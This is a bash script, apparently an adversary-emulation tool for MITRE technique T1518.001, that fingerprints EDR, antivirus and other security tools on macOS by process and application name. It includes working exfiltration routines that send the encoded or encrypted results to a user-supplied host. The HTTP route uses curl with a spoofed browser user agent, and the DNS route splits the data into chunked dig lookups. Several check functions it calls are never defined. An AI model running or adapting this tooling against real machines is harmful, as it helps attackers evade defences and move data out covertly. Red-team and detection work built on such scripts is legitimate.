

#Name: security_sofware.sh
# TTP: Security Software Discovery
# TTP ID: T1518.001
# Tactic: Discovery
# Platform: macOS
# Permissions Required: User
# Author: @darmado x.com/darmad0
# Date: 2024-09-23
# Version: 1.1

# Description: This script discovers security software installed on a macOS system,
# including antivirus, firewall, and other security tools. It checks for running
# proc, installed applications, and system configurations related to security
# software.

# Usage: ./security_software.sh [options]
# Options:
#   -v, --verbose        Enable verbose output
#   -l, --log            Enable logging to file
#   -a, --all            Run all security software checks
#   -e, --edr            Check for EDR solutions
#   --edr=OPTION         Check specific EDR component (pid|files|dir|info)
#   -f, --firewall       Check firewall status
#   -h, --hids           Check for HIDS
#   -av, --antivirus     Check for antivirus software
#   --av=OPTION          Check specific antivirus component (pid|files|dir|info)
#   -gt, --gatekeeper    Check Gatekeeper status
#   -xp, --xprotect      Check XProtect status
#   -m, --mrt            Check Malware Removal Tool status
#   --mrt=OPTION         Check specific MRT component (pid|files|config )
#   -t, --tcc            Check TCC (Transparency, Consent, and Control) status
#   --encode=TYPE        Encode output (b64, hex)
#   --encrypt=METHOD     Encrypt output (aes-256-cbc, bf, etc.). Key will be generated.
#   --exfil=http://URL   Exfiltrate output to specified URL
#   --exfil=dns=DOMAIN   Exfiltrate output via DNS to specified domain
#   --sudo               Enable sudo mode for operations requiring elevated privileges

# Note: This script is intended for educational and authorized testing purposes only.
# Ensure you have proper permissions before running on any system.

# Global variables
NAME="security_software"
TTP_ID="T1518.001"
LOG_FILE="${TTP_ID}_${NAME}.log"
VERBOSE=false
LOG_ENABLED=false
ENCODE="none"
EXFIL=false
EXFIL_METHOD=""
EXFIL_URI=""
ENCRYPT="none"
ENCRYPT_KEY=""
ALL=false
EDR_CHECK=""
AV_CHECK=""
MRT_CHECK=""
FIREWALL=false
HIDS=false
GATEKEEPER=false
XPROTECT=false
TCC=false
SUDO_MODE=false

# Command variables
CMD_LS_APP_FILES='ls -laR /Applications/'
CMD_LS_APP_DIR='ls -d /Applications/'
CMD_PS='ps -axrww | grep -v grep| grep --color=always'
CMD_SP_APP='system_profiler SPApplicationsDataType | grep --color=always -A 8 '

# Arrays to store checks
EDR_CHECKS=()
AV_CHECKS=()
MRT_CHECKS=()
SECURITY_TOOLS_CHECKS=()


cmd_ls_app_files() {
    $CMD_LS_APP_FILES"$1" 2>/dev/null
}

cmd_ls_app_dir() {
   $CMD_LS_APP_DIR"$1" 2>/dev/null
}

#TODO: i dont like  this is eval, but it works for now
# We use eval because we're passing a variable that contains pipes
cmd_sp_app() {
    eval "$CMD_SP_APP '$1'"  2>&1
}

cmd_ps() {
    eval "$CMD_PS '$1'" 2>&1
}

# AV vendor data
AV_VENDOR_PROC=(
    "MacKeeper:MacKeeper,MacKeeperAgent,com.mackeeper.MacKeeperPrivilegedHelper"
    "Malwarebytes:RTProtectionDaemon,FrontendAgent,SettingsDaemon"
    "Avast:AvastUI"
    "AvastBusinessAntivirus:AvastBusinessUI"
    "AvastFreeAntivirusforMac:AvastFreeUI"
    "AvastSecurity:AvastSecurityUI"
    "Avira:AviraUI"
    "AviraAntivirus:AviraAntivirusUI"
    "AviraFreeAntivirusforMac:AviraFreeUI"
    "Bitdefender:bdmd"
    "BitdefenderAntivirusforMac:bdmd"
    "BitdefenderAntivirusFree:bdmd"
    "BitdefenderGravityZone:bdmd"
    "ESET:ec_service"
    "ESETCyberSecurityforMac:ec_service"
    "ESETNOD32:ESETNOD32Service"
   # "F-Secure:F-Secure\ Service" ##TODO: Buggy due to spaces in the name
    "F-SecureElements:FSElementsService"
    "Kaspersky:kavsvc"
    "KasperskyFreeAntivirusforMac:kavsvc"
    "KasperskySecurityCloud:kavsvc"
    "MicrosoftDefender:Defender"
    "Norton360:Norton360Service"
    "PandaAdaptiveDefense:PandaAdaptiveService"
    "PandaSecurity:PandaService"
    "Proofpoint:ProofpointAgent"
    "Webroot:WRSAService"
    "WebrootBusinessEndpointProtection:WRBusinessService"
    "WebrootSecureAnywhere:WRSAService"
)

AV_VENDOR_APP=(
    "MacKeeper.app"
    "Avast.app"
    "AvastBusiness.app"
    "AvastFree.app"
    "AvastSecurity.app"
    "Avira.app"
    "AviraAntivirus.app"
    "AviraFree.app"
    "Bitdefender.app"
    "BitdefenderMac.app"
    "BitdefenderFree.app"
    "GravityZone.app"
    "ESET.app"
    "CyberSecurity.app"
    "NOD32.app"
    "F-Secure.app"
    "Elements.app"
    "Kaspersky.app"
    "KasperskyFree.app"
    "SecurityCloud.app"
    "Microsoft Defender.app"
    "Norton360.app"
    "PandaAdaptive.app"
    "Panda.app"
    "Proofpoint.app"
    "Webroot.app"
    "WebrootBusiness.app"
    "WebrootSecureAnywhere.app"
    "Malwarebytes.app"
)

# EDR vendor data
EDR_VENDOR_PROC=(
    "CrowdStrike:falconctl,falcon-sensor"
    "CarbonBlack:cbdaemon,cbagent"
    "SentinelOne:SentinelAgent,SentinelService"
    "Cylance:CylanceSvc,CylanceUI"
    "FireEye:FireEyeAgent,FireEyeService"
    "CiscoAMP:ampdaemon,ampservice"
    "PaloAlto:CortexService,TrapsService"
    "MicrosoftDefender:mds,mdatp"
    "TrendMicroApexOne:ds_agent,tmlisten"
    "SophosInterceptX:sophosd,sophosservice"
    "McAfee:mcafeeagent,mcafeed"
)

EDR_VENDOR_APP=(
    "CrowdStrike.app"
    "CarbonBlack.app"
    "SentinelOne.app"
    "Cylance.app"
    "FireEye.app"
    "CiscoAMP.app"
    "Cortex XDR.app"
    "Microsoft Defender.app"
    "TrendMicroSecurity.app"
    "Sophos_Endpoint.app"
    "McAfee _ndpoint Security for Mac.app"
)

# Objective-See and additional macOS security tools
SECURITY_TOOLS_PROC=(
    "BlockBlock:blockblock"
    "DoNotDisturb:DoNotDisturb"
    "LuLu:LuLu"
    "KnockKnock:KnockKnockDaemon"
    "OverSight:OverSight"
    "RansomWhere:RansomWhere"
)

SECURITY_TOOLS_APP=(
    "BlockBlock.app"
    "DoNotDisturb.app"
    "LuLu.app"
    "KnockKnock.app"
    "OverSight.app"
    "RansomWhere.app"
)


display_help() {
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Description:"
    echo "  Discovers security software installed on a macOS system, including EDR, antivirus,"
    echo "  firewall, and other security tools. It checks for running processes, installed"
    echo "  applications, and system configurations related to security software."
    echo ""
    echo "Options:"
    echo "  General:"
    echo "    -h, --help              Display this help message"
    echo "    -v, --verbose           Enable verbose output"
    echo "    -a, --all               Run all security software checks"
    echo ""
    echo "  EDR/AV Tools:"
    echo "    -e, --edr               Check all EDR components"
    echo "    --edr=OPTION            Check specific EDR component (pid|files|config|logs)"
    echo "    -av, --antivirus        Check all antivirus components"
    echo "    --av=OPTION             Check specific antivirus component (pid|files|config|logs)"
    echo ""
    echo "  Opensource Security Tools:"
    echo "    -ost, --openst          Check all opensource security tools"
    echo "    --ost=OPTION            Check specific opensource security tool comopnents (pid|files|info)"
    echo "    --openst=OPTION         Check specific opensource security tool comopnents (pid|files|info)"
    echo ""
    echo "  Firewall:"
    echo "    -f, --firewall          Check firewall status"
    echo ""
    echo "  HIDS:"
    echo "    -h, --hids              Check for HIDS"
    echo ""
    echo "  XProtect:"
    echo "    -xp, --xprotect         Check XProtect status"
    echo "    -m, --mrt               Check all Malware Removal Tool components"
    echo "    --mrt=OPTION            Check specific MRT component (pid|files|config|logs)"
    echo "    -gt, --gatekeeper       Check Gatekeeper status"
    echo "    -xp, --xprotect         Check XProtect status"
    echo "    -t, --tcc               Check TCC (Transparency, Consent, and Control) status"
    echo ""
    echo "  Output Manipulation:"
    echo "    --encode=TYPE           Encode output (b64|hex)"
    echo "    --exfil=URI             Exfiltrate output to URI using HTTP POST"
    echo "    --exfil=dns=DOMAIN      Exfiltrate output via DNS queries to DOMAIN"
    echo "    --encrypt=METHOD        Encrypt output (aes-256-cbc, bf, etc.). Generates a random key."
    echo "    -l, --log               Enable logging of output to a file"
    echo "    --sudo                 Enable sudo mode for operations requiring elevated privileges"
    echo ""
    echo "Examples:"
    echo "  $0 -a                     Run all security software checks"
    echo "  $0 -e --av=pid -f         Check all EDR components, antivirus processes, and firewall"
    echo "  $0 --edr=status --mrt=config  Check EDR status and MRT configuration"
    echo "  $0 -a --encode=b64        Run all checks and encode output in base64"
    echo ""
    echo "Note: Some options may require elevated privileges to execute successfully."
}

check_antivirus() {
    local check_type="$1"
    local output=""

    case "$check_type" in
        "pid")
            for entry in "${AV_VENDOR_PROC[@]}"; do
                procs="${entry#*:}"
                for proc in ${procs//,/ }; do
                    output+=$(cmd_ps "$proc")$'\n'
                done
            done
            ;;
        "files")
            for app_name in "${AV_VENDOR_APP[@]}"; do
                output+=$(cmd_ls_app_files "$app_name")$'\n'
            done
            ;;
        "dir")
            for app_name in "${AV_VENDOR_APP[@]}"; do
                output+=$(cmd_ls_app_dir "$app_name")$'\n'
            done
            ;;
        "info")
            for app_name in "${AV_VENDOR_APP[@]}"; do
                if app_path=$(cmd_ls_app_dir "$app_name"); then
                    app_name_colon="${app_name/.app/:}"
                    output+=$(cmd_sp_app "$app_name_colon")$'\n'
                fi
            done
            ;;
        *)
            return 1
            ;;
    esac

    echo "$output"
}

check_edr() {
    local check_type="$1"
    local output=""

    case "$check_type" in
        "pid")
            for entry in "${EDR_VENDOR_PROC[@]}"; do
                procs="${entry#*:}"
                for proc in ${procs//,/ }; do
                    output+=$(cmd_ps "$proc")$'\n'
                done
            done
            ;;
        "files")
            for edr_name in "${EDR_VENDOR_APP[@]}"; do
                output+=$(cmd_ls_app_files "$edr_name")$'\n'
            done
            ;;
        "dir")
            for edr_name in "${EDR_VENDOR_APP[@]}"; do
                output+=$(cmd_ls_app_dir "$edr_name")$'\n'
            done
            ;;
        "info")
            for edr_name in "${EDR_VENDOR_APP[@]}"; do
                if cmd_ls_app_dir "$edr_name" > /dev/null 2>&1; then
                    edr_name_colon="${edr_name/.app/:}"
                    output+=$(cmd_sp_app "$edr_name_colon")$'\n'
                fi
            done
            ;;
        *)
            return 1
            ;;
    esac

    echo "$output"
}

check_security_tools() {
    local check_type="$1"
    local output=""

    case "$check_type" in
        "pid")
            for entry in "${SECURITY_TOOLS_PROC[@]}"; do
                procs="${entry#*:}"
                for proc in ${procs//,/ }; do
                    output+=$(cmd_ps "$proc")$'\n'
                done
            done
            ;;
        "files")
            for tool_name in "${SECURITY_TOOLS_APP[@]}"; do
                output+=$(cmd_ls_app_files "$tool_name")$'\n'
            done
            ;;
        "dir")
            for tool_name in "${SECURITY_TOOLS_APP[@]}"; do
                output+=$(cmd_ls_app_dir "$tool_name")$'\n'
            done
            ;;
        "info")
            for tool_name in "${SECURITY_TOOLS_APP[@]}"; do
                if cmd_ls_app_dir "$tool_name" > /dev/null 2>&1; then
                    tool_name_colon="${tool_name/.app/:}"
                    output+=$(cmd_sp_app "$tool_name_colon")$'\n'
                fi
            done
            ;;
        *)
            return 1
            ;;
    esac

    echo "$output"
}

# Encoding function
encode_output() {
    local output=$1
    case $ENCODE in
        b64|base64)
            echo "$output" | base64
            ;;
        hex)
            echo "$output" | xxd -p
            ;;
        uuencode)
            echo "$output" | uuencode -m -
            ;;
        perl_b64)
            echo "$output" | perl -e 'use MIME::Base64; print encode_base64(join("", <STDIN>));'
            ;;
        perl_utf8)
            echo "$output" | perl -e 'use Encode qw(encode); print encode("utf8", join("", <STDIN>));'
            ;;
        *)
            echo "$output"
            ;;
    esac
}

exfiltrate_http() {
    local data="$1"
    local uri="$2"
    if [ -z "$data" ]; then
        echo "No data to exfiltrate" >&2
        return 1
    fi
    if [ "$ENCRYPT" != "none" ]; then
        data=$(encrypt_data "$data" "$ENCRYPT" "$ENCRYPT_KEY")
        encoded_key=$(echo "$ENCRYPT_KEY" | base64 | tr '+/' '-_' | tr -d '=')
    fi
    encoded_data=$(echo "$data" | base64 | tr '+/' '-_' | tr -d '=')
    
    # Determine if we're using HTTPS
    if [[ "$uri" == https://* ]]; then
        curl_opts="--insecure"
    else
        curl_opts=""
    fi
    
    local full_uri="$uri?d=$encoded_data"
    if [ "$ENCRYPT" != "none" ]; then
        full_uri="${full_uri}&_k=$encoded_key"
    fi
    
    if [ "$VERBOSE" = true ]; then
        echo "Exfiltrating data to $uri"
        curl -v $curl_opts -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15" "$full_uri"
    else
        curl -s $curl_opts -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15" "$full_uri" > /dev/null 2>&1
    fi
}

exfiltrate_dns() {
    local data=$1
    local domain=$2
    local id=$3
    local encoded_data=$(echo "$data" | base64 | tr '+/' '-_' | tr -d '=')
    local encoded_id=$(echo "$id" | base64 | tr '+/' '-_' | tr -d '=')
    local chunk_size=63  # Max length of a DNS label

    # Send the ID first
    dig +short "${encoded_id}.id.$domain" A > /dev/null

    # Then send the data in chunks
    local i=0
    while [ -n "$encoded_data" ]; do
        chunk="${encoded_data:0:$chunk_size}"
        encoded_data="${encoded_data:$chunk_size}"
        dig +short "${chunk}.${i}.$domain" A > /dev/null
        i=$((i+1))
    done
    # Send a final chunk to indicate end of transmission
    dig +short "end.$domain" A > /dev/null
}

setup_log() {
    local script_name=$(basename "$0" .sh)
    touch "$LOG_FILE"
}

log_output() {
    local output="$1"
    local max_size=$((5 * 1024 * 1024))  # 5MB in bytes
    
    if [ ! -f "$LOG_FILE" ] || [ $(stat -f%z "$LOG_FILE") -ge $max_size ]; then
        setup_log
    fi
    
    echo "$output" >> "$LOG_FILE"
    
    # Rotate log if it exceeds 5MB
    if [ $(stat -f%z "$LOG_FILE") -ge $max_size ]; then
        mv "$LOG_FILE" "${LOG_FILE}.old"
        setup_log
    fi
}

#log output
log_and_append() {
    local result="$1"
    
    # Only log if logging is enabled
    if [ "$LOG_ENABLED" = true ]; then
        echo "$result" >> "$LOG_FILE"
    fi
}



# Argument parsing
while [ "$#" -gt 0 ]; do
    case "$1" in
        -h|--help) display_help; exit 0 ;;
        -v|--verbose) VERBOSE=true ;;
        -l|--log) LOG_ENABLED=true ;;
        -a|--all) ALL=true ;;
        -e|--edr) EDR_CHECKS+=("all") ;;
        --edr=*)
            EDR_CHECKS+=("${1#*=}")
            if [[ -z "${1#*=}" ]]; then
                echo "Warning: No value provided for --edr. Please specify a valid option." >&2
                exit 1
            fi
            ;;
        -f|--firewall) FIREWALL=true ;;
        -h|--hids) HIDS=true ;;
        -av|--antivirus) AV_CHECKS+=("all") ;;
        --av=*)
            AV_CHECKS+=("${1#*=}")
            if [[ -z "${1#*=}" ]]; then
                echo "Warning: No value provided for --av. Please specify a valid option." >&2
                exit 1
            fi
            ;;
        -gk|--gatekeeper) GATEKEEPER=true ;;
        -xp|--xprotect) XPROTECT=true ;;
        -m|--mrt) MRT_CHECKS+=("all") ;;
        --mrt=*)
            MRT_CHECKS+=("${1#*=}")
            if [[ -z "${1#*=}" ]]; then
                echo "Warning: No value provided for --mrt. Please specify a valid option." >&2
                exit 1
            fi
            ;;
        -t|--tcc) TCC=true ;;
        --openst=*)
            SECURITY_TOOLS_CHECKS+=("${1#*=}")
            if [[ -z "${1#*=}" ]]; then
                echo "Warning: No value provided for --openst. Please specify a valid option." >&2
                exit 1
            fi
            ;;
        --encode=*)
            ENCODE="${1#*=}"
            if [[ -z "$ENCODE" ]]; then
                echo "Warning: No value provided for --encode. Please specify a valid encoding type." >&2
                exit 1
            fi
            ;;
        --encrypt=*)
            ENCRYPT="${1#*=}"
            if [[ -z "$ENCRYPT" ]]; then
                echo "Warning: No value provided for --encrypt. Please specify a valid encryption method." >&2
                exit 1
            fi
            ENCRYPT_KEY=$(openssl rand -base64 32 | tr -d '\n/')
            ;;
        --exfil=*)
            EXFIL=true
            EXFIL_METHOD="${1#*=}"
            if [[ "$EXFIL_METHOD" == dns=* ]]; then
                EXFIL_METHOD="dns"
                EXFIL_URI="${1#*=dns=}"
            elif [[ "$EXFIL_METHOD" == http* ]]; then
                EXFIL_METHOD="http"
                EXFIL_URI="${1#*=}"
            else
                echo "Warning: Invalid exfiltration method or URI. Please provide a valid URI for --exfil." >&2
                exit 1
            fi
            ;;
        --sudo) SUDO_MODE=true ;;
        *) echo "Unknown option: $1" >&2; display_help; exit 1 ;;
    esac
    shift
done

main() {
    local output=""
    local encoded_output=""

    if [ "$ALL" = true ] || [ ${#EDR_CHECKS[@]} -gt 0 ] || [ ${#AV_CHECKS[@]} -gt 0 ] || [ "$FIREWALL" = true ] || 
       [ ${#MRT_CHECKS[@]} -gt 0 ] || [ "$GATEKEEPER" = true ] || [ "$XPROTECT" = true ] || 
       [ "$TCC" = true ] || [ ${#SECURITY_TOOLS_CHECKS[@]} -gt 0 ]; then
        
        for edr_check in "${EDR_CHECKS[@]}"; do
            output+=$(check_edr "$edr_check")
        done
        for av_check in "${AV_CHECKS[@]}"; do
            output+=$(check_antivirus "$av_check")
        done
        if [ "$FIREWALL" = true ]; then
            output+=$(check_firewall)
        fi
        for mrt_check in "${MRT_CHECKS[@]}"; do
            output+=$(check_component "MRT" "$mrt_check" MRT_PROCESSES[@] MRT_FILES[@] MRT_CONFIG_FILES[@])
        done
        if [ "$GATEKEEPER" = true ]; then
            output+=$(check_gatekeeper)
        fi
        if [ "$XPROTECT" = true ]; then
            output+=$(check_xprotect)
        fi
        if [ "$TCC" = true ]; then
            output+=$(check_tcc)
        fi
        for security_tools_check in "${SECURITY_TOOLS_CHECKS[@]}"; do
            output+=$(check_security_tools "$security_tools_check")
        done
    else
        display_help
        exit 0
    fi

    if [ -n "$output" ]; then
        encoded_output=$(encode_output "$output")
        if [ "$EXFIL" = true ]; then
            if [ "$EXFIL_METHOD" = "http" ]; then
                exfiltrate_http "$encoded_output" "$EXFIL_URI"
            elif [ "$EXFIL_METHOD" = "dns" ]; then
                exfiltrate_dns "$encoded_output" "$EXFIL_URI" "$TTP_ID"
            fi
        else
            echo "$encoded_output"
        fi
    else
        echo "No security software information found"
    fi
}

main
